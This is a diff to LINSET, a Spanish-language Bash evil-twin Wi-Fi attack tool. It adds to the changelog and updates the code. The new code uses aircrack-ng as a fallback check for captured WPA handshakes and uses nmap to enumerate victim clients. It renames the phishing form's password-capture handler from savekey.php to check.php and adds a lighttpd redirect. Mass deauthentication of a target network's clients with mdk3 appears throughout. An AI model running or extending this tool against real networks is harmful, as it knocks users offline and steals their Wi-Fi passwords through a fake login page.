@@ -10,7 +10,7 @@
 #################################################################
 #                                                               #
 # # -*- ENCODING: UTF-8 -*-                                     #
-# Este script es software libre. Puede redistribuirlo y/o     #
+# Este script es software libre. Puede redistribuirlo y/o       #
 # modificar-lo bajo los términos de la Licencia Pública General #
 # de GNU según es publicada por la Free Software Foundation,    #
 # bien de la versión 3 de dicha Licencia o bien (según su       #
@@ -202,6 +202,18 @@
 ## #Desautentificar masivamente a varios MAC con igual ESSID
 ## #Manipaular .cap complejos para usar el handshake del objetivo
 ## #Invertido menu de comprobacion de handshake
+## #Cmabiado savekey.php a check.php
+## #Regla lighttpd para redirigir www.domain.com a domain.com
+## #Fix para mostrar clientes activos en directo
+## #Agregado nmap a las dependencias
+##
+########## 31-10-2014 LINSET 0.15
+##
+## #Mas info a la hora de elegir una interfaz wireless
+## #Capacidad de intentar confirmar handshake local con aircrack-ng
+## #Añadido SIGHUP
+## #Arreglado problema de desautentificaciones mdk3
+## #Mejorado contador de tiempo
 ##
 ##########
 clear
@@ -215,7 +227,7 @@ DUMP_PATH="/tmp/TMPlinset"
 # Numero de desautentificaciones
 DEAUTHTIME="8"
 # Numero de revision
-revision=35
+revision=38
 # Numero de version
 version=0.14
 # Rango de IP que se usaran en DHCP
@@ -291,7 +303,7 @@ function err_report {
 
 
 # Si se cierra el script inesperadamente, ejecutar la funcion
-trap exitmode SIGINT
+trap exitmode SIGINT SIGHUP
 
 # Funcion que limpia las interfaces y sale
 function exitmode {
@@ -572,6 +584,15 @@ function checkdependences {
 	fi
 	sleep 0.025
 	
+	echo -ne "Nmap............"
+	if ! [ -f /usr/bin/nmap ]; then
+		echo -e "\e[1;31mNot installed"$rescolor""
+		salir=1
+	else
+		echo -e "\e[1;32mOK!"$rescolor""
+	fi
+	sleep 0.025
+	
 	echo -ne "Php5-cgi........"
 	if ! [ -f /usr/bin/php-cgi ]; then
 		echo -e "\e[1;31mNot installed"$rescolor""
@@ -687,7 +708,7 @@ fi
 function infoap {
 	
 	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
-	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
+	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
 	echo "INFO AP OBJETIVO"
 	echo
 	echo -e "                     "$verde"SSID"$rescolor" = $Host_SSID / $Host_ENC"
@@ -812,7 +833,7 @@ function setinterface {
 	done
 	
 	# Crea una variable con la lista interfaces de red fisicas
-	readarray -t wirelessifaces < <(airmon-ng |grep "-" | awk '{print $1}')
+	readarray -t wirelessifaces < <(airmon-ng |grep "-" | cut -d- -f1)
 	INTERFACESNUMBER=`airmon-ng| grep -c "-"`
 	
 	echo
@@ -837,7 +858,7 @@ function setinterface {
 		
 		echo -n "#? "
 		read line
-		PREWIFI=${wirelessifaces[$line]}
+		PREWIFI=$(echo ${wirelessifaces[$line]} | awk '{print $1}')
 		
 		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
 			conditional_clear
@@ -1105,9 +1126,28 @@ function handshakelocation {
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
 						webinterface
 					else
-					echo "Bad handshake"
+					echo "Handshake incompleto."
+					echo
 					sleep 4
-					handshakelocation
+					echo "Puede probar suerte con aircrack-ng, ya que es mas permisivo..."
+					echo "Desea probar con aircrack-ng en vez de pyrit para comprobar el handshake? [ ENTER = NO ]"
+					echo
+					echo -n "Respuesta: "
+					echo -ne "$rojo"
+					read handshakeloc_aircrack
+					echo -ne "$rescolor"
+					if [ "$handshakeloc_aircrack" = "" ]; then
+						handshakelocation
+					else
+						if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
+							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
+							webinterface
+						else
+							echo "El handshake es corrupto"
+							sleep 4
+							handshakelocation
+						fi
+					fi
 					fi
 				else
 					echo -e "${rojo}Error$rescolor!"
@@ -1141,8 +1181,8 @@ function deauthforce {
 		
 		echo "TIPO DE COMPROBACION DEL HANDSHAKE"
 		echo "                                       "
-		echo -e "      "$verde"1)"$rescolor" Normal (Posibilidades de fallo)"
-		echo -e "      "$verde"2)"$rescolor" Estricto"
+		echo -e "      "$verde"1)"$rescolor" aircrack-ng (Posibilidades de fallo)"
+		echo -e "      "$verde"2)"$rescolor" pyrit"
 		echo -e "      "$verde"3)"$rescolor" Atras"
 		echo "                                       "
 		echo -n "      #> "
@@ -1505,7 +1545,7 @@ if (file_get_contents(\"\$intento\") == 1) {
 sleep(1);
 }
 
-?>" > $DUMP_PATH/data/savekey.php
+?>" > $DUMP_PATH/data/check.php
 
 # Se crea el config del servidor DHCP
 echo "authoritative;
@@ -1561,6 +1601,12 @@ server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
 index-file.names = ( \"index.htm\" )
+
+#Redirect www.domain.com to domain.com
+\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+}
+
 " >$DUMP_PATH/lighttpd.conf
 
 # Script (no es mio) que redirige todas las peticiones del DNS a la puerta de enlace (nuestro PC)
@@ -1677,7 +1723,7 @@ function attack {
 	
 	killall aireplay-ng &> $linset_output_device
 	killall mdk3 &> $linset_output_device
-	echo "$(cat $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
+	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 	
 	xterm -hold $TOPRIGHT -title "Esperando la pass" -e $DUMP_PATH/handcheck &
@@ -1717,7 +1763,8 @@ function handshakecheck {
 	minutos=0
 	horas=0
 	i=0
-	  
+	timestamp=\$(date +%s)
+	
 	while true; do
 	
 	segundos=\$i
@@ -1776,7 +1823,7 @@ function handshakecheck {
 		">>$DUMP_PATH/handcheck
 	fi
 	
-	echo "readarray -t CLIENTESDHCP < <(cat $DUMP_PATH/clientes.txt | grep \"DHCPACK on\"| awk '!x[\$0]++' )
+	echo "readarray -t CLIENTESDHCP < <(nmap -sP -oG - $RANG_IP.100-110 2>&1 | grep Host )
 	
 	echo
 	echo -e \"  PUNTO DE ACCESO:\"
@@ -1786,21 +1833,36 @@ function handshakecheck {
 	echo -e \"    Fabricante......: "$verde"$Host_MAC_MODEL"$rescolor"\"
 	echo -e \"    Tiempo activo...: "$gris"\$ih\$horas:\$im\$minutos:\$is\$segundos"$rescolor"\"
 	echo -e \"    Intentos........: "$rojo"\$(cat $DUMP_PATH/hit.txt)"$rescolor"\"
-	echo -e \"    Clientes........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '!x[\$0]++' | wc -l)"$rescolor"\"
+	echo -e \"    Clientes........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | sort| uniq | wc -l)"$rescolor"\"
 	echo
-	echo -e \"  CLIENTES:\"
+	echo -e \"  CLIENTES ACTIVOS:\"
 	
 	x=0
-	for line in \"\${CLIENTESDHCP[@]}\"; do
+	for cliente in \"\${CLIENTESDHCP[@]}\"; do
 	  x=\$((\$x+1))
-	  echo -e \"    "$verde"\$x) "$rojo"\$(echo \$line| cut -d \" \" -f 3) "$amarillo"\$(echo \$line| cut -d \" \" -f 5) "$verde"\$(echo \$line| cut -d \" \" -f 6)"$rescolor"\"   
+	  CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
+	  CLIENTE_MAC=\$(nmap -sP \$CLIENTE_IP 2>&1 | grep -i mac | cut -d \" \" -f3 | tr [:upper:] [:lower:])
+	  
+	  if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
+		CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
+	  fi
+	  
+	  CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
+	  
+	  if echo \$CLIENTE_MAC| grep -q x; then
+		    CLIENTE_FABRICANTE=\"unknown\"
+	  fi
+	  
+	  CLIENTE_HOSTNAME=\$(echo \$cliente| cut -d \" \" -f 3 | cut -d \"(\" -f2 | cut -d \")\" -f1)
+	  
+	  echo -e \"    $verde\$x) $rojo\$CLIENTE_IP $amarillo\$CLIENTE_MAC $rescolor($azul\$CLIENTE_FABRICANTE$rescolor) $verde\$CLIENTE_HOSTNAME$rescolor\"   
 	done
 	
 	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
 	
 	
 	if [ $authmode = "handshake" ]; then
-		echo "let i=\$i+1
+		echo "let i=\$(date +%s)-\$timestamp
 		sleep 1">>$DUMP_PATH/handcheck
 		
 	elif [ $authmode = "wpa_supplicant" ]; then
@@ -4741,7 +4803,7 @@ CwABBAAAAAAEAAAAAFBLBQYAAAAAAwADABIBAAAKVwIAAAA=
 	
 		<div data-role=\"content\">
 		<fieldset>
-		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"savekey.php\" method=\"POST\" >
+		    <form id=\"check-user\" class=\"ui-body ui-body-a ui-corner-all\" data-ajax=\"false\" action=\"check.php\" method=\"POST\" >
 	<div class=ui-grid-c>
 	
 	      <div class=ui-block-a>ESSID:</div>
